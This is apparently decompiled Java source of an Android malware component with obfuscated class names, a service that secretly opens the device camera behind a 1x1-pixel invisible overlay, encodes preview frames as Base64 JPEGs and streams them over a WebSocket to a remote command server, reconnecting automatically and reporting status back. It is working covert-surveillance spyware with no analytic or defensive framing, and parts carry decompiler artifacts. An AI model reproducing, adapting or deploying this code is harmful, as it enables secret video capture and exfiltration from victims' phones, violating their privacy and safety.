/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Rect
 *  android.graphics.YuvImage
 *  android.hardware.Camera
 *  android.hardware.Camera$Parameters
 *  android.hardware.Camera$PreviewCallback
 *  android.hardware.Camera$Size
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.provider.Settings
 *  android.util.Base64
 *  android.view.SurfaceHolder
 *  android.view.SurfaceHolder$Callback
 *  android.view.SurfaceView
 *  android.view.View
 *  android.view.ViewGroup$LayoutParams
 *  android.view.WindowManager
 *  android.view.WindowManager$LayoutParams
 *  okhttp3.OkHttpClient
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;
import linker.resourcer.encoder.lmqhtifjzrtsgjcqpakvh;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.pjdmhiibhsbamasbtrvmuxtgi;
import linker.resourcer.encoder.pjwwsenqqgjuwxeer$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.pjwwsenqqgjuwxeer$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONException;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class pjwwsenqqgjuwxeer
extends Service
implements SurfaceHolder.Callback {
    public static final String ACTION_STOP_CAM = "ACTION_STOP_C";
    private static boolean Camskp98;
    public static boolean Camused;
    public static String CommandData;
    private static Object Lockobj;
    private static int Notifi_ID;
    public static WindowManager.LayoutParams Win_Layout;
    public static WindowManager Win_Manage;
    public static boolean camlive;
    public static boolean ctd;
    public static Camera mycamera;
    public static WebSocket ws;
    private List<byte[]> BytsArry;
    private String Clientid;
    private int Qulty = 70;
    public SurfaceView Srf_Vew;
    private OkHttpClient client;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    static {
        mycamera = null;
        Camused = false;
        ctd = false;
        Lockobj = new Object();
        Notifi_ID = 111;
        Camskp98 = false;
        camlive = true;
    }

    public pjwwsenqqgjuwxeer() {
        this.BytsArry = new ArrayList<byte[]>();
    }

    private void Livemessage(Context object, String string2, String string3) {
        if (ws != null) {
            String string4;
            block4: {
                string4 = vyklwirattpkwkqagsbrm.Read(object, "ID", "Deviceid");
                if (string4 != null) break block4;
                return;
            }
            try {
                object = vyklwirattpkwkqagsbrm.Read(object, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("idf", (Object)this.Clientid);
                jSONObject.put("pid", (Object)string4);
                jSONObject.put("itype", (Object)"Slr_client");
                jSONObject.put("subc", (Object)"msg");
                jSONObject.put("msg", (Object)string2);
                jSONObject.put("cip", object);
                jSONObject.put("conk", (Object)string3);
                ws.send(jSONObject.toString());
            }
            catch (JSONException jSONException) {
                jSONException.printStackTrace();
            }
        }
    }

    static /* synthetic */ OkHttpClient access$002(pjwwsenqqgjuwxeer pjwwsenqqgjuwxeer2, OkHttpClient okHttpClient) {
        pjwwsenqqgjuwxeer2.client = okHttpClient;
        return okHttpClient;
    }

    static /* synthetic */ int access$300(pjwwsenqqgjuwxeer pjwwsenqqgjuwxeer2) {
        return pjwwsenqqgjuwxeer2.Qulty;
    }

    static /* synthetic */ void access$400(pjwwsenqqgjuwxeer pjwwsenqqgjuwxeer2, Context context, String string2, String string3) {
        pjwwsenqqgjuwxeer2.Livemessage(context, string2, string3);
    }

    public static String load() {
        int n;
        String string2;
        String string3 = string2 = "";
        List list = Camera.open((int)0).getParameters().getSupportedPreviewSizes();
        string3 = string2;
        try {
            new Vector();
            n = 0;
        }
        catch (Exception exception) {
            string2 = string3;
        }
        while (true) {
            string3 = string2;
            if (n >= list.size()) break;
            string3 = string2;
            string3 = string2;
            CharSequence charSequence = new StringBuilder();
            string3 = string2;
            charSequence = charSequence.append("[").append(String.valueOf(((Camera.Size)list.get((int)n)).width)).append("x").append(String.valueOf(((Camera.Size)list.get((int)n)).height)).append("],").toString();
            string3 = string2;
            string3 = string2;
            StringBuilder stringBuilder = new StringBuilder();
            string3 = string2;
            string2 = stringBuilder.append(string2).append((String)charSequence).toString();
            ++n;
            continue;
            break;
        }
        return string2;
    }

    private void startforground(Context context) {
        try {
            context = pjdmhiibhsbamasbtrvmuxtgi.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 0x40000000);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void ReleaseAll(Context var1_1) {
        block14: {
            try {
                if (pjwwsenqqgjuwxeer.mycamera != null) {
                    pjwwsenqqgjuwxeer.mycamera.setPreviewCallback(null);
                    pjwwsenqqgjuwxeer.mycamera.release();
                    pjwwsenqqgjuwxeer.mycamera = null;
                }
                pjwwsenqqgjuwxeer.ctd = false;
                pjwwsenqqgjuwxeer.Camused = false;
            }
            catch (Exception var1_2) {
                // empty catch block
            }
            if (jhvbzpdwpbqgticwdxuva.AccessWindow == null || jhvbzpdwpbqgticwdxuva.Access_layParms == null) break block14;
            var2_7 = pjwwsenqqgjuwxeer.Camused;
            if (var2_7 != false) return;
            try {
                if (this.Srf_Vew == null) return;
                if (this.Srf_Vew.getWindowToken() == null) return;
                this.Srf_Vew.getHolder().removeCallback((SurfaceHolder.Callback)this);
                jhvbzpdwpbqgticwdxuva.AccessWindow.removeView((View)this.Srf_Vew);
                this.Srf_Vew = null;
                return;
            }
            catch (Exception var1_3) {
                return;
            }
        }
        if (this.Srf_Vew == null) return;
        var1_1 = this.Srf_Vew.getWindowToken();
        if (var1_1 == null) return;
        this.Srf_Vew.getHolder().removeCallback((SurfaceHolder.Callback)this);
        pjwwsenqqgjuwxeer.Win_Manage.removeView((View)this.Srf_Vew);
        this.Srf_Vew = null;
        pjwwsenqqgjuwxeer.Win_Manage = null;
        ** GOTO lbl43
        {
            catch (Throwable var1_4) {
                ** GOTO lbl45
            }
            catch (Exception var1_5) {}
            {
                var1_5.printStackTrace();
            }
            try {
                this.Srf_Vew = null;
                pjwwsenqqgjuwxeer.Win_Manage = null;
lbl43:
                // 2 sources

                pjwwsenqqgjuwxeer.Win_Layout = null;
                return;
lbl45:
                // 1 sources

                this.Srf_Vew = null;
                pjwwsenqqgjuwxeer.Win_Manage = null;
                pjwwsenqqgjuwxeer.Win_Layout = null;
                throw var1_4;
            }
            catch (Exception var1_6) {
                // empty catch block
            }
        }
    }

    public void Step2(Context context) {
        new Thread(new Runnable(){
            final pjwwsenqqgjuwxeer this$0;
            final Context val$ctx;
            {
                this.this$0 = pjwwsenqqgjuwxeer2;
                this.val$ctx = context;
            }

            @Override
            public void run() {
                pjwwsenqqgjuwxeer.access$002(this.this$0, new OkHttpClient());
                Request request = new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build();
                ws = this.this$0.client.newWebSocket(request, new WebSocketListener(this){
                    final 1 this$1;
                    {
                        this.this$1 = var1_1;
                    }

                    public void onClosing(WebSocket webSocket, int n, String string2) {
                        super.onClosing(webSocket, n, string2);
                        if (camlive) {
                            camlive = false;
                            try {
                                Thread.sleep(3000L);
                            }
                            catch (InterruptedException interruptedException) {
                                interruptedException.printStackTrace();
                            }
                            this.this$1.this$0.Step2(this.this$1.val$ctx);
                        }
                    }

                    public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                        super.onFailure(webSocket, throwable, response);
                        if (camlive) {
                            camlive = false;
                            try {
                                Thread.sleep(3000L);
                            }
                            catch (InterruptedException interruptedException) {
                                interruptedException.printStackTrace();
                            }
                            this.this$1.this$0.Step2(this.this$1.val$ctx);
                        }
                    }

                    public void onMessage(WebSocket object, String string2) {
                        super.onMessage((WebSocket)object, string2);
                        try {
                            object = new JSONObject(string2);
                            object = object.optString("type", "empty");
                            if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                                this.this$1.this$0.killall();
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }

                    public void onOpen(WebSocket webSocket, Response response) {
                        new Thread(this){
                            final 1 this$2;
                            {
                                this.this$2 = var1_1;
                            }

                            /*
                             * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
                             * Unable to fully structure code
                             * Enabled aggressive block sorting
                             * Enabled unnecessary exception pruning
                             * Enabled aggressive exception aggregation
                             */
                            @Override
                            public void run() {
                                block19: {
                                    block20: {
                                        block17: {
                                            try {
                                                pjwwsenqqgjuwxeer.ctd = true;
                                                pjwwsenqqgjuwxeer.camlive = true;
                                                var8_1 = vyklwirattpkwkqagsbrm.Read(this.this$2.this$1.val$ctx, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY);
lbl5:
                                                // 3 sources

                                                while (var3_4 = pjwwsenqqgjuwxeer.camlive) {
                                                    var6_13 /* !! */  = null;
                                                    var5_10 /* !! */  = null;
                                                    var7_14 = null;
                                                    var4_5 = var5_10 /* !! */ ;
                                                    break block17;
                                                }
                                                return;
                                            }
                                            catch (Exception var4_9) {
                                                var4_9.printStackTrace();
                                                return;
                                            }
                                        }
                                        try {
                                            var9_15 = pjwwsenqqgjuwxeer.access$100();
                                            var4_5 = var5_10 /* !! */ ;
                                            synchronized (var9_15) {
                                                var5_10 /* !! */  = var7_14;
                                                var4_5 = var6_13 /* !! */ ;
                                                if (pjwwsenqqgjuwxeer.access$200(this.this$2.this$1.this$0).size() <= 0) break block18;
                                                var4_5 = var6_13 /* !! */ ;
                                            }
                                        }
                                        catch (OutOfMemoryError var4_6) {
                                            break block19;
                                        }
                                        catch (Exception var5_11) {
                                            // empty catch block
                                            break block20;
                                        }
                                        {
                                            block18: {
                                                var5_10 /* !! */  = (Camera.Parameters)((byte[])pjwwsenqqgjuwxeer.access$200(this.this$2.this$1.this$0).get(0));
                                                var4_5 = var5_10 /* !! */ ;
                                                pjwwsenqqgjuwxeer.access$200(this.this$2.this$1.this$0).remove(0);
                                            }
                                            var4_5 = var5_10 /* !! */ ;
                                        }
                                        var4_5 = var5_10 /* !! */ ;
                                    }
                                    try {
                                        var5_10 /* !! */  = pjwwsenqqgjuwxeer.mycamera.getParameters();
                                        var1_2 = var5_10 /* !! */ .getPreviewSize().width;
                                        var2_3 = var5_10 /* !! */ .getPreviewSize().height;
                                        var5_10 /* !! */  = new YuvImage((byte[])var4_5, 17, var1_2, var2_3, null);
                                        var4_5 = new ByteArrayOutputStream();
                                        var6_13 /* !! */  = new Rect(0, 0, var1_2, var2_3);
                                        var5_10 /* !! */ .compressToJpeg(var6_13 /* !! */ , pjwwsenqqgjuwxeer.access$300(this.this$2.this$1.this$0), (OutputStream)var4_5);
                                        var5_10 /* !! */  = (Camera.Parameters)var4_5.toByteArray();
                                    }
                                    catch (Exception var4_7) {
                                        // empty catch block
                                        break block19;
                                    }
                                    try {
                                        var6_13 /* !! */  = Base64.encodeToString((byte[])var5_10 /* !! */ , (int)0);
                                        var5_10 /* !! */  = new JSONObject();
                                        var5_10 /* !! */ .put("type", (Object)"cam");
                                        var5_10 /* !! */ .put("img", (Object)var6_13 /* !! */ );
                                        var5_10 /* !! */ .put("cuz", (Object)"v");
                                        var5_10 /* !! */  = var5_10 /* !! */ .toString();
                                        pjwwsenqqgjuwxeer.access$400(this.this$2.this$1.this$0, this.this$2.this$1.val$ctx, (String)var5_10 /* !! */ , var8_1);
                                    }
                                    catch (Exception var5_12) {
                                        // empty catch block
                                    }
                                    {
                                        var4_5.close();
                                    }
                                }
                                try {
                                    Thread.sleep(1L);
                                }
                                catch (InterruptedException var4_8) {}
                                ** GOTO lbl5
                            }
                        }.start();
                    }
                });
            }
        }).start();
    }

    public boolean ck() {
        block5: {
            Camera camera;
            try {
                camera = Camera.open();
                if (camera == null) break block5;
            }
            catch (Throwable throwable) {
                if (false) {
                    throw new NullPointerException();
                }
                throw throwable;
            }
            catch (RuntimeException runtimeException) {
                if (false) {
                    throw new NullPointerException();
                }
                return true;
            }
            camera.release();
        }
        return false;
    }

    public void killall() {
        camlive = false;
        this.mainHandler.post((Runnable)new pjwwsenqqgjuwxeer$$ExternalSyntheticLambda0(this));
        try {
            if (ws != null) {
                ws.cancel();
                ws = null;
            }
            if (this.client != null) {
                this.client.dispatcher().cancelAll();
                this.client.connectionPool().evictAll();
                this.client.dispatcher().executorService().shutdown();
                this.client = null;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /* synthetic */ void lambda$killall$1$com-icontrol-protector-pjwwsenqqgjuwxeer() {
        this.ReleaseAll(this.getApplicationContext());
    }

    /* synthetic */ void lambda$onStartCommand$0$com-icontrol-protector-pjwwsenqqgjuwxeer() {
        Win_Manage.addView((View)this.Srf_Vew, (ViewGroup.LayoutParams)Win_Layout);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.startforground(this.getApplicationContext());
    }

    public void onDestroy() {
        super.onDestroy();
        if (ws != null) {
            ws.close(1000, "Closing");
        }
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public int onStartCommand(Intent var1_1, int var2_4, int var3_5) {
        block11: {
            block12: {
                block9: {
                    block10: {
                        if (var1_1 == null) ** GOTO lbl9
                        var4_6 = var1_1.getAction();
                        if (var4_6 != null && var4_6.equals("ACTION_STOP_C")) {
                            this.killall();
                            this.stopForeground(false);
                            this.stopSelf();
                            return 2;
                        }
lbl9:
                        // 3 sources

                        var4_6 = this.getApplicationContext();
                        this.startforground((Context)var4_6);
                        if (var1_1 == null) return 1;
                        if (var1_1.hasExtra("CData") == false) return 1;
                        var5_7 /* !! */  = jhvbzpdwpbqgticwdxuva.AccessWindow;
                        if (var5_7 /* !! */  != null && jhvbzpdwpbqgticwdxuva.Access_layParms != null) {
                            pjwwsenqqgjuwxeer.CommandData = var1_1.getStringExtra("CData");
                            pjwwsenqqgjuwxeer.Camused = this.ck();
                            if (!pjwwsenqqgjuwxeer.Camused) {
                                var1_1 = new SurfaceView(this.getApplicationContext());
                                this.Srf_Vew = var1_1;
                                jhvbzpdwpbqgticwdxuva.Access_layParms.gravity = 51;
                                jhvbzpdwpbqgticwdxuva.AccessWindow.addView((View)this.Srf_Vew, (ViewGroup.LayoutParams)jhvbzpdwpbqgticwdxuva.Access_layParms);
                                this.Srf_Vew.getHolder().addCallback((SurfaceHolder.Callback)this);
                                this.Step2((Context)var4_6);
                                return 1;
                            }
                            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer((Context)var4_6, "Camera start fail", "Camera in use By another App");
                            this.ReleaseAll((Context)var4_6);
                            return 2;
                        }
                        pjwwsenqqgjuwxeer.CommandData = var1_1.getStringExtra("CData");
                        pjwwsenqqgjuwxeer.Camused = this.ck();
                        if (pjwwsenqqgjuwxeer.Camused) ** GOTO lbl69
                        pjwwsenqqgjuwxeer.Win_Manage = (WindowManager)var4_6.getSystemService("window");
                        var1_1 = new SurfaceView(this.getApplicationContext());
                        this.Srf_Vew = var1_1;
                        var2_4 = 2038;
                        if (Build.VERSION.SDK_INT < 26) break block9;
                        if (!Settings.canDrawOverlays((Context)var4_6)) break block10;
                        if (!pjwwsenqqgjuwxeer.Camskp98) {
                            var2_4 = 2998;
                        }
                        var1_1 = new WindowManager.LayoutParams(1, 1, var2_4, 56, -1);
                        pjwwsenqqgjuwxeer.Win_Layout = var1_1;
                        break block11;
                    }
                    var1_1 = new WindowManager.LayoutParams(1, 1, 1000, 56, -1);
                    pjwwsenqqgjuwxeer.Win_Layout = var1_1;
                    break block12;
                }
                var1_1 = new WindowManager.LayoutParams(1, 1, 2006, 262144, -3);
                pjwwsenqqgjuwxeer.Win_Layout = var1_1;
            }
            var2_4 = 2038;
        }
        pjwwsenqqgjuwxeer.Win_Layout.gravity = 51;
        {
            catch (Exception var1_3) {
                var1_3.printStackTrace();
                return 2;
            }
        }
        try {
            var1_1 = this.mainHandler;
            var5_7 /* !! */  = new pjwwsenqqgjuwxeer$$ExternalSyntheticLambda1(this);
            var1_1.post((Runnable)var5_7 /* !! */ );
            ** GOTO lbl66
        }
        catch (Exception var1_2) {
            if (var2_4 != 2998) ** GOTO lbl66
            pjwwsenqqgjuwxeer.Camskp98 = true;
lbl66:
            // 3 sources

            this.Srf_Vew.getHolder().addCallback((SurfaceHolder.Callback)this);
            this.Step2((Context)var4_6);
            return 1;
lbl69:
            // 1 sources

            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer((Context)var4_6, "Camera start fail", "Camera in use By another App");
            this.ReleaseAll((Context)var4_6);
            return 2;
        }
    }

    public void surfaceChanged(SurfaceHolder surfaceHolder, int n, int n2, int n3) {
        if (mycamera != null) {
            mycamera.setPreviewCallback(new Camera.PreviewCallback(this){
                final pjwwsenqqgjuwxeer this$0;
                {
                    this.this$0 = pjwwsenqqgjuwxeer2;
                }

                /*
                 * Enabled aggressive block sorting
                 * Enabled unnecessary exception pruning
                 * Enabled aggressive exception aggregation
                 */
                public void onPreviewFrame(byte[] byArray, Camera object) {
                    if (byArray == null) {
                        return;
                    }
                    try {
                        if (ws == null) return;
                        if (!ctd) return;
                        if (this.this$0.client == null) return;
                        if (this.this$0.BytsArry.size() > 25) return;
                        object = Lockobj;
                        synchronized (object) {
                            this.this$0.BytsArry.add(byArray);
                        }
                    }
                    catch (Exception exception) {
                        return;
                    }
                    catch (OutOfMemoryError outOfMemoryError) {
                        // empty catch block
                        return;
                    }
                }
            });
        }
    }

    /*
     * Unable to fully structure code
     */
    public void surfaceCreated(SurfaceHolder var1_1) {
        block16: {
            var6_3 = pjwwsenqqgjuwxeer.CommandData.split(",");
            try {
                pjwwsenqqgjuwxeer.mycamera = Camera.open((int)Integer.valueOf(var6_3[0]));
            }
            catch (RuntimeException var3_4) {
                // empty catch block
            }
            var7_7 = pjwwsenqqgjuwxeer.mycamera.getParameters();
            var4_8 = null;
            var3_5 = null;
            if (pjwwsenqqgjuwxeer.mycamera.getParameters().getSupportedPreviewSizes() == null) break block16;
            var8_9 = pjwwsenqqgjuwxeer.mycamera.getParameters().getSupportedPreviewSizes().iterator();
            while (true) {
                var4_8 = var3_5;
                if (!var8_9.hasNext()) break;
                var5_11 = (Camera.Size)var8_9.next();
                var4_8 = var3_5;
                if (var5_11.width > 600) {
                    var2_10 = var5_11.height;
                    var4_8 = var3_5;
                    if (var2_10 > 400) {
                        var4_8 = var5_11;
                    }
                }
                var3_5 = var4_8;
                continue;
                break;
            }
        }
        try {
            if (var6_3.length > 1) {
                var4_8.width = Integer.valueOf(var6_3[1]);
                var4_8.height = Integer.valueOf(var6_3[2]);
                this.Qulty = Integer.valueOf(var6_3[3]);
            }
            ** GOTO lbl39
        }
        catch (Exception var3_6) {
            try {
                var4_8.width = 0;
                var4_8.height = 0;
lbl39:
                // 2 sources

                if (var4_8.width == 0 || var4_8.height == 0) {
                    var4_8.width = 640;
                    var4_8.height = 480;
                }
                if (var7_7.getSupportedFocusModes().contains("continuous-video")) {
                    var7_7.setFocusMode("continuous-video");
                }
                this.Clientid = var6_3[4];
                var7_7.setPreviewSize(var4_8.width, var4_8.height);
                var7_7.setPreviewFormat(17);
                pjwwsenqqgjuwxeer.mycamera.setParameters(var7_7);
                pjwwsenqqgjuwxeer.mycamera.setPreviewDisplay(var1_1);
                pjwwsenqqgjuwxeer.mycamera.startPreview();
            }
            catch (Exception var1_2) {
                // empty catch block
            }
        }
    }

    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }
}

